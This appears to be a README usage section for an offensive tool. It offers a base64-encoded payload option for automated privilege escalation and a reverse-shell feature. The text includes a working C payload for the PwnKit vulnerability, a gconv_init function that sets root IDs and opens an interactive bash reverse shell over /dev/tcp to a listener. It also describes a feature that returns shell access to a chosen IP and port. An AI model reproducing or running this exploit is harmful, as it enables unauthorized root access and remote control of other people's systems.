## How To Use

Currently has three features which are :
#### Automate-Privesc
this allows you to put in a base64 encoded string which contains the code run in poppy but with an execution of reverse-shell instead , which means when you execute it , it shall directly test and exploit pwnkit vulnerability using poppy, the payload should be something like this:
```c
#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
  setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);  
  system("/usr/bin/sudo -u root /usr/bin/bash -c '/usr/bin/bash -i &>/dev/tcp/127.0.0.1/1337 <&1'");
  exit(0);
}
```
#### Reverse Shell
this is a classic one , you just put in your IP and Port and you shall definitely get shell access back to your listener if you are having trouble using the shell feature and you want to use a shell instead:
